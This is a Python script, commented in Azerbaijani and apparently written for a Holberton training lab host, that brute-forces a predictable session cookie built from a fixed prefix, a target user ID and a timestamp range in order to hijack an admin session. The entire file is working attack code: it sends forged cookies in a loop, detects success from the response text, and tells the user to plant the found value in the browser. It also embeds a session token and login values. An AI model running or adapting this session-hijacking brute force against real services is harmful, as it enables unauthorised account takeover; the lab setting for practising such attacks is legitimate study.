import requests
import json
import time

# --- SƏNİN MƏLUMATLARIN ---
URL = "http://web0x01.hbtn/api/a1/hijack_session/login"
# Brauzerdən götürdüyün əsas sessiya cookie-si
SESSION_COOKIE = "QJpcG7ULpwaZsQbQ4XngdXzFC1UcRdoevm4HKVblc9c.f4sGDIavh0kEOIou21mV-tCSlOM"

# ID-nin sabit hissəsi və hədəf User ID (o boşluq olan 8418802)
PREFIX = "ebaf4a57-083b-4b38-ad7"
TARGET_USER = "3864845"

# Zaman aralığı (sənin 801 və 803 sessiyalarının timestamp-ləri arası)
START_TS = 17687447593
END_TS   = 17687449609

def hunt_admin():
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Content-Type": "application/json",
        "Referer": "http://web0x01.hbtn/a1/hijack_session/"
    })

    # Login üçün istifadə olunan data (serverin yoxlaması üçün lazımdır)
    login_data = {"email": "s@gmail.com", "password": "dsfs"}

    print(f"[*] Axtarış başlayır: {TARGET_USER} üçün {START_TS}-dən {END_TS}-ə qədər...")
    print("-" * 60)

    for ts in range(START_TS, END_TS + 1):
        # Sənin formatına uyğun: PREFIX-USER-TIMESTAMP
        hijack_value = f"{PREFIX}-{TARGET_USER}-{ts}"
        
        cookies = {
            "hijack_session": hijack_value,
            "session": SESSION_COOKIE
        }

        try:
            r = s.post(URL, cookies=cookies, data=json.dumps(login_data), timeout=5)
            
            # Əgər cavabda "Try Harder" yoxdursa, deməli Admin sessiyasını tutduq!
            if "Try Harder" not in r.text:
                print(f"\n\n[!!!] BİNGO! ADMIN SESSİYASI TAPILDI!")
                print(f"[+] Hijack ID: {hijack_value}")
                print(f"[+] Status: {r.status_code}")
                print(f"[+] Cavab: {r.text[:150]}...") 
                return hijack_value

            # Hər 20 cəhddən bir terminalda proqresi göstər
            if ts % 20 == 0:
                print(f"[-] Yoxlanılır: {ts}...", end="\r")

        except Exception as e:
            print(f"\n[!] Xəta: {e}")
            break

    print("\n\n[!] Təəssüf ki, bu aralıqda tapılmadı. Aralığı genişləndirmək lazım ola bilər.")
    return None

if __name__ == "__main__":
    found_id = hunt_admin()
    if found_id:
        print("\n[MƏSLƏHƏT] İndi brauzerdə 'hijack_session' cookie-sini bu dəyərlə dəyiş və F5 et!")
